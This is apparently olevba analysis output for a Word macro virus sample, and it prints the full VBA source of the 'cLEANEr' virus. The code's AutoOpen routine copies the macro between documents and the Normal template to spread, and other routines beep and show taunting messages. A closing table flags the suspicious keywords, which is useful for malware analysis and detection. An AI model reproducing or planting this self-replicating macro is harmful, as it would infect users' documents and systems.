olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Poc.b-284fa8d190fb2b0eaf16134f691c03630c22aee6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Poc.b-284fa8d190fb2b0eaf16134f691c03630c22aee6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO cLEANEr.bas 
in file: Virus.MSWord.Poc.b-284fa8d190fb2b0eaf16134f691c03630c22aee6 - OLE stream: 'Macros/VBA/cLEANEr'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Gene.cLEANEr virus authored by GeneCode


Sub AutoOpen()
Application.EnableCancelKey = True
Options.VirusProtection = True
Set V1Stealth = CommandBars("Tools")
Set V2Stealth = V1Stealth.Controls(12)
V2Stealth.Enabled = True

If UCase(ThisDocument.Name) = "NORMAL.DOT" Then
  For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "cLEANEr" Then GoTo EndCleaner
  Next i
    VSource = NormalTemplate.FullName
    VTarget = ActiveDocument.FullName
Else
  For i = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(i).Name = "cLEANEr" Then GoTo EndCleaner
  Next i
    VSource = ActiveDocument.FullName
    VTarget = NormalTemplate.FullName
End If
Application.OrganizerCopy VSource, VTarget, "cLEANEr", wdOrganizerObjectProjectItems
EndCleaner:
End Sub

Sub Save()
Set myDocument = ActiveDocument
With myDocument.Shapes.AddShape(msoSmileyFace, 90, 90, 90, 50).Fill
    .ForeColor.RGB = RGB(128, 0, 0)
    .BackColor.RGB = RGB(170, 0, 170)
    .TwoColorGradient msoGradientHorizontal, 1
End With
End Sub

Sub AutoClose()
Dim Count As Integer
    For Count = 1 To 10
        Beep
        Beep
    Next
MsgBox "cLEANEr Says All Work And No Play Makes You A LAMER!"
End Sub


-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Poc.b-284fa8d190fb2b0eaf16134f691c03630c22aee6 - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

